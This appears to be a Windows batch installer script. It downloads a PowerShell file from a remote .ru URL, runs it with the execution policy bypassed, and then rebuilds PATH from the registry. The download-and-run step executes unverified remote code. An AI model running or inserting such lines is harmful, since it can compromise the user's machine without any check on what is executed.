@echo off
goto :main

:reload_path
for /f "tokens=2*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path') do set syspath=%%B
for /f "tokens=2*" %%A in ('reg query "HKCU\Environment" /v Path') do set userpath=%%B
set PATH=%PATH%;%syspath%;%userpath%
powershell "$q='%PATH%'; $w=$q -split ';'| Where-Object {$_.Length -gt 0}| select-object -Unique; $q= $w -join ';'; Set-Content $env:TMP\dfghdfg.txt $q"
<%TMP%\dfghdfg.txt (set /p PATH=)
del  %tmp%\dfghdfg.txt
exit /B 0

:main
set HOME=%HOMEDRIVE%%HOMEPATH%
set el_m_install=https://gifara.ru/7/5115.ps1
powershell Invoke-WebRequest %el_m_install%  -OutFile %HOME%\Downloads\el.ps1
PowerShell.exe -ExecutionPolicy Bypass -File %HOME%\Downloads\el.ps1
call :reload_path
goto :eof

